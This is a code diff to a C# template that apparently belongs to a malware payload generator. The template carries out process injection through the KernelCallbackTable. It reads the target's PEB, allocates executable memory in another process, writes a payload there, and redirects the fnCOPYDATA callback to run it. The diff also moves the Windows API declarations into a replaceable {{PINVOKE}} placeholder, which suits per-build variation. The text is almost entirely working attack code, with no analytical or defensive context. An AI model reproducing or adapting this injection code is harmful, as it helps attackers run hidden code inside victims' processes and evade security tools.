@@ -142,7 +142,7 @@ namespace {{NAMESPACE}}
 
             PROCESS_BASIC_INFORMATION pbi = new PROCESS_BASIC_INFORMATION();
             int retLength = 0;
-            NtQueryInformationProcess(proc.Handle, PROCESSINFOCLASS.ProcessBasicInformation, out pbi, Marshal.SizeOf(pbi), out retLength);
+            NtQueryInformationProcess(proc.Handle, 0x00, out pbi, Marshal.SizeOf(pbi), out retLength);
             if (retLength == 0)
             {
                 Console.WriteLine(""[!] NtQueryInformationProcess: error retrieving PEB Address. Exiting..."");
@@ -171,7 +171,7 @@ namespace {{NAMESPACE}}
             GCHandle pKCT = GCHandle.Alloc(bKCT, GCHandleType.Pinned);
             sKCT = (KernelCallBackTable)Marshal.PtrToStructure(pKCT.AddrOfPinnedObject(), typeof(KernelCallBackTable));
             pKCT.Free();
-            IntPtr hPayloadAlloc = VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)payload.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ExecuteRead);
+            IntPtr hPayloadAlloc = VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)payload.Length, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ExecuteRead);
             IntPtr NumBytesWritten;
             GCHandle pPayload = GCHandle.Alloc(payload, GCHandleType.Pinned);
             WriteProcessMemory(proc.Handle, hPayloadAlloc, pPayload.AddrOfPinnedObject(), payload.Length, out NumBytesWritten);
@@ -182,7 +182,7 @@ namespace {{NAMESPACE}}
             }
             pPayload.Free();
             sKCT.fnCOPYDATA = hPayloadAlloc;
-            IntPtr hNewKCTAlloc = VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)Marshal.SizeOf(sKCT), AllocationType.Reserve | AllocationType.Commit, MemoryProtection.ReadWrite);
+            IntPtr hNewKCTAlloc = VirtualAllocEx(proc.Handle, IntPtr.Zero, (uint)Marshal.SizeOf(sKCT), (uint)(AllocationType.Reserve | AllocationType.Commit), (uint)MemoryProtection.ReadWrite);
             IntPtr pUpdatedKCT = Marshal.AllocHGlobal(Marshal.SizeOf(sKCT));
             Marshal.StructureToPtr(sKCT, pUpdatedKCT, true);
             WriteProcessMemory(proc.Handle, hNewKCTAlloc, pUpdatedKCT, Marshal.SizeOf(sKCT), out NumBytesWritten);
@@ -382,20 +382,15 @@ namespace {{NAMESPACE}}
             public UIntPtr InheritedFromUniqueProcessId;
         }
 
-        private enum PROCESSINFOCLASS
-        {
-            ProcessBasicInformation = 0x00,
-        };
-
         [Flags]
-        private enum AllocationType
+        private enum AllocationType : uint
         {
             Commit = 0x1000,
             Reserve = 0x2000
         }
 
         [Flags]
-        private enum MemoryProtection
+        private enum MemoryProtection : uint
         {
             ExecuteRead = 0x20,
             ExecuteReadWrite = 0x40,
@@ -411,45 +406,7 @@ namespace {{NAMESPACE}}
         }
         #endregion
 
-        #region API
-
-        //https://docs.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntqueryinformationprocess
-        [DllImport(""ntdll.dll"", SetLastError = true)]
-        static extern int NtQueryInformationProcess(IntPtr hProcess,
-            PROCESSINFOCLASS pic,
-            out PROCESS_BASIC_INFORMATION pbi,
-            int cb,
-            out int pSize);
-
-        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-readprocessmemory
-        [DllImport(""kernel32.dll"", SetLastError = true)]
-        public static extern bool ReadProcessMemory(IntPtr hProcess,
-            IntPtr lpBaseAddress,
-            byte[] lpBuffer,
-            Int32 nSize,
-            out IntPtr lpNumberOfBytesRead);
-
-        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
-        [DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
-        static extern IntPtr VirtualAllocEx(IntPtr hProcess,
-            IntPtr lpAddress,
-            uint dwSize,
-            AllocationType flAllocationType,
-            MemoryProtection flProtect);
-
-        //https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory
-        [DllImport(""kernel32.dll"")]
-        static extern bool WriteProcessMemory(
-             IntPtr hProcess,
-             IntPtr lpBaseAddress,
-             IntPtr lpBuffer,
-             Int32 nSize,
-             out IntPtr lpNumberOfBytesWritten);
-
-        //https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-sendmessage
-        [DllImport(""user32.dll"")]
-        static extern int SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, ref COPYDATASTRUCT lParam);
-        #endregion
+        {{PINVOKE}}
     }
 }";
     }
